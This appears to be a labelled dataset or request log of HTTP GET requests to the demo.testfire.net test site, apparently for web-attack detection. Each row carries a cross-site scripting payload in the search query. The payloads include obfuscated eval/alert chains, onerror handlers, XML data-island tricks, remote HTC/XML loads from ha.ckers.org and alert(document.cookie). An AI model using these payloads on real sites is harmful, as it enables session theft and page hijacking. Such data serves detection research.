GET,http://demo.testfire.net/search.jsp?query=1];a=eval;b=alert;a(b(17));//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,275
GET,http://demo.testfire.net/search.jsp?query=1;a=eval;b=alert;a(b(/c/.source));,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,320
GET,http://demo.testfire.net/search.jsp?query=xyz onerror=alert(6);,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,323
GET,"http://demo.testfire.net/search.jsp?query=<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x></xml><span datasrc=#i datafld=c dataformatas=html>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,316
GET,"http://demo.testfire.net/search.jsp?query=<xml id=""xss""><i><b><img src=""javas<!-- -->cript:alert('xss')""></b></i></xml><span datasrc=""#xss"" datafld=""b"" dataformatas=""html""></span>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,315
GET,"http://demo.testfire.net/search.jsp?query=<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert('xss')</script>""> </body></html>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,300
GET,"http://demo.testfire.net/search.jsp?query=<html xmlns:xss><?import namespace=""xss"" implementation=""httP://ha.ckers.org/xss.htc""><xss:xss>xss</xss:xss></html>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,295
GET,"http://demo.testfire.net/search.jsp?query=<xml src=""httP://ha.ckers.org/xsstest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,295
GET,"http://demo.testfire.net/search.jsp?query=<?xml version=""1.0""?><html:html xmlns:html='httP://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,296
